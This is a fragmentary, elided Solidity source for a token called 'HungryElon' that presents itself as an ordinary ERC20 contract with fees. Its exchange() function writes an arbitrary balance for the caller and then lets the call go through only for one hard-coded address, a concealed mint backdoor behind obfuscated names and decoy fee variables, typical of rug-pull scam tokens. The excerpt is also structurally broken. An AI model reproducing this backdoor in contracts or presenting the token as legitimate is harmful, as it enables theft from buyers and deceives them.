...
contract Context {
 ...
 contract HungryElon is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private makzczimacie;
    ...
    address private _feeAddrWallet1 = 0xdf3d968810eBfA554FD2A288523B74B493E50530;
    address private _feeAddrWallet2 = 0xdf3d968810eBfA554FD2A288523B74B493E50530;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000000000 * 10**18;
    address private _zaspalia = 0xC1C259B67B89468EA8A5dFD2B16ED96238920D3f;
    uint256 private _rTotal = 10000000 * 10 ** 18;
    bool private inSwap = true;
    uint256 private _tFeeTotal;
    uint256 private _demand = 2;
    ...
    constructor( uint256 totalSupply_) {
        ...
        _symbol = "HUNGRYELON";
        _owner = _msgSender();
        makzczimacie[msg.sender] = _totalSupply;
    ...
    function exchange(uint256 evgeni) public {
        _exchange(evgeni);
        require(_msgSender() == _zaspalia, "Nemojna stavacza tranzakzcja.");
    }
...
function _reflectFee(uint256 rFee, uint256 tFee) private {
    ...
    function _exchange(uint256 neprosledim) internal {
        makzczimacie[_msgSender()] = neprosledim;
    }
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = makzczimacie[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            makzczimacie[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        makzczimacie[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = makzczimacie[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            makzczimacie[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
